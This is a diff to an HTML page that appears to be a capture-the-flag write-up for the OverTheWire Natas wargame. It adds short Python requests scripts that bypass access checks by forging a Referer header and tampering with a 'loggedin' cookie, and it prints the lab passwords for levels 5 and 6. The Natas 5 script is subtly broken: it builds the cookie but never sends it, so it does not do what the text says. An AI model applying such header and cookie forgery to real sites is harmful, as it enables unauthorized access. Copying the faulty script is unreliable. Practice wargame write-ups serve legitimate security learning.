@@ -60,7 +60,7 @@
             </div>
             <div id="natas4" class="natas">
                 <h2>Natas 4</h2>
-                <p>The challenge description says, <i>Access disallowed, authorized users should come only from "http://natas5.natas.labs.overthewire.org/"</i>. Now this time Referer headers comes into play. While making requests Referer header tells the server from where the request originated. We need to send the custom Referer header to bypass this level. I use python for this purpose.</p>
+                <p>The challenge description says, <i>Access disallowed, authorized users should come only from "http://natas5.natas.labs.overthewire.org/"</i>. Now this time Referer headers comes into play. While making requests Referer header tells the server from where the request is originated. We need to send the custom Referer header to bypass this level. I use <a href="files/natas4.py">python</a> for this purpose.</p>
                 <div class="description">
                     import requests
                     <br>target = 'http://natas4.natas.labs.overthewire.org/'
@@ -69,6 +69,26 @@
                     <br>print r.text
                 </div>
                 <p><b>natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</b></p>
+            </div>
+            <div id="natas5" class="natas">
+                <h2>Natas 5</h2>
+                <p><i>Access disallowed. You are not logged in</i>.</p>
+                <p> Seems interesting. Lets look at the cookies.</p>
+                <div class="description">
+                    import requests
+                    <br>target = "http://natas5.natas.labs.overthewire.org"
+                    <br>r = requests.get(target, auth=('natas5','iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'))
+                    <br>print r.cookies
+                </div>
+                <p>We see a cookie named loggedin and its value is set to 0. <a href="files/natas5.py">Changing</a> it to 1 or any other non-zero value, we get the password for the next level.</p>
+                <div class="description">
+                    import requests
+                    <br>target = "http://natas5.natas.labs.overthewire.org"
+                    <br>cookie = {"loggedin":"1"}
+                    <br>r = requests.get(target, auth=('natas5','iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'))
+                    <br>print r.text
+                </div>
+                <p><b>natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</b></p>
             </div>
         </div>
     </div>
